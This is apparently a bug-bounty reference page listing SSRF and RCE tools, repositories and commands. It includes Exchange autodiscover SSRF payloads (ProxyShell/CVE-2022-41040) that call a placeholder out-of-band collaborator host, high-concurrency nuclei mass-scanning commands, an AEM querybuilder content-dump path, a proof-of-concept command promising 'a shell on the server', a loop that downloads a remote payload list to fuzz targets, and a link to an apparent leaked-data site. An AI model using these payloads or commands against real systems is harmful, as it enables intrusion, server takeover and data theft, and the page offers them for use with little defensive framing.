---
title: "Out Of Band"
summary: "out-of-band tools and commands."
status: "reviewed"
last_reviewed: "2026-06-06"
tags:
  - tools
  - out-of-band
related: []
references: []
---
# Out Of Band

### https://github.com/Th0h0/autossrf

- Type: `burp_extension`
- Kind: `url`
- Bug class: `ssrf`
- Tier: `tier_2_useful`
- Value: https://github.com/Th0h0/autossrf

### cat ssrf | ssrf-finder

- Type: `command`
- Kind: `snippet`
- Bug class: `ssrf`
- Tier: `tier_2_useful`
- Value: cat ssrf | ssrf-finder

### cat urls-his | gf ssrf | anew ssrf

- Type: `command`
- Kind: `snippet`
- Bug class: `ssrf`
- Tier: `tier_2_useful`
- Value: cat urls-his | gf ssrf | anew ssrf

### nuclei -c 500 -l urls.txt -t nuclei-templates/ -severity critical,high -ept ssl,

- Type: `command`
- Kind: `snippet`
- Bug class: `auth;lfi;rce;sqli;ssrf;xxe`
- Tier: `tier_2_useful`
- Value: nuclei -c 500 -l urls.txt -t nuclei-templates/ -severity critical,high -ept ssl,tcp -tags cve,rce,log4j,grafana,tomcat,solar,apache,lfi,ssrf,sql,xxe,symfony,exposure,traversal,panel,default-login,confluence,vmware,vcenter -o url_results.txt

### assetnote/surf

- Type: `github_repo`
- Kind: `url`
- Bug class: `general`
- Tier: `tier_2_useful`
- Value: https://github.com/assetnote/surf/

### https://github.com/akincibor/SSRFexploit

- Type: `github_repo`
- Kind: `url`
- Bug class: `ssrf`
- Tier: `tier_2_useful`
- Value: https://github.com/akincibor/SSRFexploit

### random-robbie/ssrf-finder

- Type: `github_repo`
- Kind: `url`
- Bug class: `ssrf;xss`
- Tier: `tier_2_useful`
- Value: https://github.com/random-robbie/ssrf-finder

### /autodiscover/autodiscover.json/v1.0/aa..@%d.v3.COLLABHERE/owa/?&Email=autodisco

- Type: `payload`
- Kind: `snippet`
- Bug class: `general`
- Tier: `tier_5_placeholder_payload`
- Value: /autodiscover/autodiscover.json/v1.0/aa..@%d.v3.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a..@%d.v3.COLLABHERE&Protocol=Autodiscoverv1&Protocol=Powershell

### /autodiscover/autodiscover.json/v1.0/aa@%d.v2.COLLABHERE?Protocol=Autodiscoverv1

- Type: `payload`
- Kind: `snippet`
- Bug class: `general`
- Tier: `tier_5_placeholder_payload`
- Value: /autodiscover/autodiscover.json/v1.0/aa@%d.v2.COLLABHERE?Protocol=Autodiscoverv1

### /autodiscover/autodiscover.json/v1.0/aa@%d.v4.COLLABHERE/owa/?&Email=autodiscove

- Type: `payload`
- Kind: `snippet`
- Bug class: `general`
- Tier: `tier_5_placeholder_payload`
- Value: /autodiscover/autodiscover.json/v1.0/aa@%d.v4.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a@%d.v4.COLLABHERE&Protocol=Autodiscoverv1&Protocol=Powershell

### /autodiscover/autodiscover.json/v1.0/aa@autodiscover/autodiscover.json?a..@%d.v9

- Type: `payload`
- Kind: `snippet`
- Bug class: `general`
- Tier: `tier_5_placeholder_payload`
- Value: /autodiscover/autodiscover.json/v1.0/aa@autodiscover/autodiscover.json?a..@%d.v9.COLLABHERE&Protocol=Autodiscoverv1&Protocol=Powershell

### /autodiscover/autodiscover.json?@%d.v1.COLLABHERE/&Email=autodiscover/autodiscov

- Type: `payload`
- Kind: `snippet`
- Bug class: `general`
- Tier: `tier_5_placeholder_payload`
- Value: /autodiscover/autodiscover.json?@%d.v1.COLLABHERE/&Email=autodiscover/autodiscover.json%3f@%d.v1.COLLABHERE

### /autodiscover/autodiscover.json?aa..%d.v5.COLLABHERE/owa/?&Email=autodiscover/au

- Type: `payload`
- Kind: `snippet`
- Bug class: `general`
- Tier: `tier_5_placeholder_payload`
- Value: /autodiscover/autodiscover.json?aa..%d.v5.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a..%d.v5.COLLABHERE&Protocol=Autodiscoverv1&%d.v5.COLLABHEREProtocol=Powershell

### /autodiscover/autodiscover.json?aa..%d.v7.COLLABHERE/owa/?&Email=aa@autodiscover

- Type: `payload`
- Kind: `snippet`
- Bug class: `general`
- Tier: `tier_5_placeholder_payload`
- Value: /autodiscover/autodiscover.json?aa..%d.v7.COLLABHERE/owa/?&Email=aa@autodiscover/autodiscover.json?a..%d.v7.COLLABHERE&Protocol=Autodiscoverv1&%d.v7.COLLABHEREProtocol=Powershell

### /autodiscover/autodiscover.json?aa@%d.v6.COLLABHERE/owa/?&Email=autodiscover/aut

- Type: `payload`
- Kind: `snippet`
- Bug class: `general`
- Tier: `tier_5_placeholder_payload`
- Value: /autodiscover/autodiscover.json?aa@%d.v6.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a@%d.v6.COLLABHERE&Protocol=Autodiscoverv1&%d.v6.COLLABHEREProtocol=Powershell

### /autodiscover/autodiscover.json?aa@%d.v8.COLLABHERE/owa/?&Email=aa@autodiscover/

- Type: `payload`
- Kind: `snippet`
- Bug class: `general`
- Tier: `tier_5_placeholder_payload`
- Value: /autodiscover/autodiscover.json?aa@%d.v8.COLLABHERE/owa/?&Email=aa@autodiscover/autodiscover.json?a@%d.v8.COLLABHERE&Protocol=Autodiscoverv1&%d.v8.COLLABHEREProtocol=Powershell

### https://github.com/plenumlab/rce-finder

- Type: `burp_extension`
- Kind: `url`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: https://github.com/plenumlab/rce-finder

### https://github.com/whwlsfb/Log4j2Scan

- Type: `burp_extension`
- Kind: `url`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: https://github.com/whwlsfb/Log4j2Scan

### Find AEM hosts via nuclei and aem-hacker

- Type: `command`
- Kind: `snippet`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: Find AEM hosts via nuclei and aem-hacker

### git clone https://github.com/pmiaowu/log4j2Scan

- Type: `command`
- Kind: `snippet`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: git clone https://github.com/pmiaowu/log4j2Scan

### nuclei -l urls -tags aem -c 500 -o aem-resulte

- Type: `command`
- Kind: `snippet`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: nuclei -l urls -tags aem -c 500 -o aem-resulte

### nuclei -urls -t proxyshell.yaml -c 400 -o output.txt

- Type: `command`
- Kind: `snippet`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: nuclei -urls -t proxyshell.yaml -c 400 -o output.txt

### nuclei scanner for proxyshell ( CVE-2021–34473 )

- Type: `command`
- Kind: `snippet`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: nuclei scanner for proxyshell ( CVE-2021–34473 )

### python3 aem_discoverer.py — file urls.txt — workers 150

- Type: `command`
- Kind: `snippet`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: python3 aem_discoverer.py — file urls.txt — workers 150

### python3 CVE-2022–41040.py -u url and you will get a shell on the server

- Type: `command`
- Kind: `snippet`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: python3 CVE-2022–41040.py -u url and you will get a shell on the server

### Use the following curl commands to get targets from these resources:

- Type: `command`
- Kind: `snippet`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: Use the following curl commands to get targets from these resources:

### You can use nuclei log4j templates

- Type: `command`
- Kind: `snippet`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: You can use nuclei log4j templates

### GitHub - 4ndersonLin/awesome-cloud-security: 🛡️ Awesome Cloud Security Resources ⚔️

- Type: `github_repo`
- Kind: `url`
- Bug class: `cloud;rce`
- Tier: `tier_2_useful`
- Value: https://github.com/4ndersonLin/awesome-cloud-security#aws-1

### https://github.com/p0dalirius/Awesome-RCE-techniques

- Type: `github_repo`
- Kind: `url`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: https://github.com/p0dalirius/Awesome-RCE-techniques

### kljunowsky/CVE-2022-41040-POC

- Type: `github_repo`
- Kind: `url`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: https://github.com/kljunowsky/CVE-2022-41040-POC

### pmiaowu/log4j2Scan

- Type: `github_repo`
- Kind: `url`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: https://github.com/pmiaowu/log4j2Scan

### - /bin/querybuilder.json?type=nt:base&p.limit=-1

- Type: `payload`
- Kind: `snippet`
- Bug class: `general`
- Tier: `tier_2_useful`
- Value: - /bin/querybuilder.json?type=nt:base&p.limit=-1

### 0ang3el/aem-hacker

- Type: `tool`
- Kind: `url`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: https://github.com/0ang3el/aem-hacker

### cve 2022 41040 unfurl payloads.txt|sed

- Type: `tool`
- Kind: `url`
- Bug class: `rce;recon`
- Tier: `tier_2_useful`
- Value: https://gist.githubusercontent.com/kljunowsky/a2e8392f63fb8d7c0443f2011bce59ec/raw/7b4cabaa0dab7113b1cab00e1a2cb0c4e3c6ed06/cve-2022-41040-unfurl-payloads.txt|sed

### emadshanab/Proxyshell-Scanner

- Type: `tool`
- Kind: `url`
- Bug class: `rce`
- Tier: `tier_2_useful`
- Value: https://github.com/emadshanab/Proxyshell-Scanner

### leakedsource.ru

- Type: `tool`
- Kind: `url`
- Bug class: `rce;recon`
- Tier: `tier_2_useful`
- Value: https://leakedsource.ru

### for url in $(curl -s https://gist.githubusercontent.com/kljunowsky/a2e8392f63fb8

- Type: `payload`
- Kind: `snippet`
- Bug class: `rce;recon`
- Tier: `tier_5_placeholder_payload`
- Value: for url in $(curl -s https://gist.githubusercontent.com/kljunowsky/a2e8392f63fb8d7c0443f2011bce59ec/raw/7b4cabaa0dab7113b1cab00e1a2cb0c4e3c6ed06/cve-2022-41040-unfurl-payloads.txt|sed ‘s/COLLABHERE/<OOB-PAYLOAD>/g’); do cat targets.txt |unfurl format $url >> fuzz-ready.txt;done & ffuf -w fuzz-ready.txt -u FUZZ
